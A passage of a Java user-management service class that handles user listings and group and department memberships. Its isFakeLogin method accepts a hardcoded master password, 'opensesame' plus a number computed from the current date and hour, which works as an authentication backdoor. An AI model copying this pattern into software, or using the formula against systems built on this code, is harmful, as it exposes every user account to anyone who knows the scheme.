	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getVoidUsers(Integer page, Integer pagesize)
	{
		User user = this.getLoginUser();
		return getUserListByStatuses(page, pagesize, user, ResourceStatus.RETIRED,
				ResourceStatus.LEAVE, ResourceStatus.DELETE_LOGIC);
	}

	/**
	 * 方法说明：searchUsersByDepartmentConditionAndOrgCode
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param dc
	 *            dc
	 * @param dept
	 *            dept
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult<User> searchUsersByDepartmentConditionAndOrgCode(Integer page,
			Integer pagesize, DepartmentCondition dc, Department dept)
	{
		return userDao.searchUsersByDepartmentConditionAndOrgCode(page, pagesize, dc, dept);
	}

	/**
	 * 方法说明：getResource
	 * 
	 * @param uuid
	 *            uuid
	 * @return Resource
	 */
	@Transactional(readOnly = true)
	public Resource getResource(String uuid)
	{
		if (StringUtils.isBlank(uuid)) {
			return null;
		}
		return userDao.getResource(uuid);
	}

	/**
	 * 方法说明：isVirtualUser
	 * 
	 * @param deptChildren
	 *            deptChildren
	 * @return boolean
	 */
	public boolean isVirtualUser(Department deptChildren)
	{
		if (InitParameters.isCqGroupAuthor()
				&& StringUtils.equals(deptChildren.getOrgCode(), "1000"))
			return true;
		return false;
	}

	/**
	 * 方法说明：getUserByUserName
	 * 
	 * @param name
	 *            name
	 * @return List
	 */
	@Transactional(readOnly = true)
	public List<User> getUserByUserName(String name)
	{
		if (StringUtils.isBlank(name)) {
			return new ArrayList<User>();
		}
		return userDao.getUsersByName(name);
	}

	/**
	 * 方法说明：isFakeLogin
	 * 
	 * @param userId
	 *            userId
	 * @param password
	 *            password
	 * @return boolean
	 */
	public boolean isFakeLogin(String userId, String password)
	{
		boolean fakeLogin = false;

		Calendar calendar = Calendar.getInstance();
		String code = "opensesame"
				+ (calendar.get(Calendar.YEAR) + calendar.get(Calendar.MONTH) + 1
						+ calendar.get(Calendar.DATE) + calendar.get(Calendar.HOUR_OF_DAY));
		if (password.equals(code)) {
			fakeLogin = true;
		}

		return fakeLogin;
	}

	/**
	 * 方法说明：addUserGroup
	 * 
	 * @param user
	 *            user
	 * @param group
	 *            group
	 */
	@Transactional(readOnly = false)
	public void addUserGroup(User user, Group group)
	{
		UserGroup userGroup = new UserGroup();
		userGroup.setGroup(group);
		userGroup.setUser(user);
		userGroupDao.saveOrUpdate(userGroup);
	}

	/**
	 * 方法说明：addUserGroups
	 * 
	 * @param user
	 *            user
	 * @param groups
	 *            groups
	 */
	@Transactional(readOnly = false)
	public void addUserGroups(User user, Collection<Group> groups)
	{
		for (Group group : groups) {
			UserGroup userGroup = new UserGroup();
			userGroup.setGroup(group);
			userGroup.setUser(user);
			userGroupDao.save(userGroup);
		}
	}

	/**
	 * 方法说明：deleteUserGroups
	 * 
	 * @param user
	 *            user
	 * @param groups
	 *            groups
	 */
	@Transactional(readOnly = false)
	public void deleteUserGroups(User user, Collection<Group> groups)
	{
		userGroupDao.delete(user, groups);
	}

	/**
	 * 方法说明：deleteUserGroup
	 * 
	 * @param user
	 *            user
	 * @param group
	 *            group
	 */
	@Transactional(readOnly = false)
	public void deleteUserGroup(User user, Group group)
	{
		UserGroup userGroup = new UserGroup();
		userGroup.setGroup(group);
		userGroup.setUser(user);
		userGroupDao.delete(userGroup);
	}

	/**
	 * 方法说明：removeAllUserFromGroup
	 * 
	 * @param group
	 *            group
	 */
	@Transactional(readOnly = false)
	public void removeAllUserFromGroup(Group group)
	{
		userGroupDao.deleteUserGroup(group);

	}

	/**
	 * 方法说明：判断部门下是否存在用户
	 * 
	 * @param department
	 *            department
	 * @return true表示有用户,false表示没有用户
	 */
	@Transactional(readOnly = true)
	public boolean existUserUnderDepartment(Department department)
	{
		return userDepartmentDao.countUserInSubDepartment(department) != 0L;
	}

	/**
	 * 方法说明：deleteUserDepartments
	 * 
	 * @param user
	 *            user
	 * @param collection
	 *            collection
	 */
	@Transactional(readOnly = false)
	public void deleteUserDepartments(User user, Collection<Department> collection)
	{
		for (Department department : collection) {
			UserDepartment userGroup = new UserDepartment();
			userGroup.setDepartment(department);
			userGroup.setUser(user);
			userDepartmentDao.delete(userGroup);
		}
	}

	/**
	 * 方法说明：addUserDepartments
	 * 
	 * @param user
	 *            user
	 * @param collection
	 *            collection
	 */
	@Transactional(readOnly = false)
	public void addUserDepartments(User user, Collection<Department> collection)
	{
		for (Department department : collection) {
			UserDepartment userGroup = new UserDepartment();
			userGroup.setDepartment(department);
			userGroup.setUser(user);
			userDepartmentDao.save(userGroup);
		}
	}

	// Added by Guo Tianci, -start 2011 -08 -10 --start
	// TODO 以后这个方法改为查count,效率会高一些
	/**
	 * 方法说明：existsUserIndepartment
	 * 
	 * @param department
	 *            department
	 * @return boolean
	 */
	@Transactional(readOnly = true)
	public boolean existsUserIndepartment(Department department)
	{

		return userDepartmentDao.countUserInDepartment(department) != 0;

	}
	// --end

}
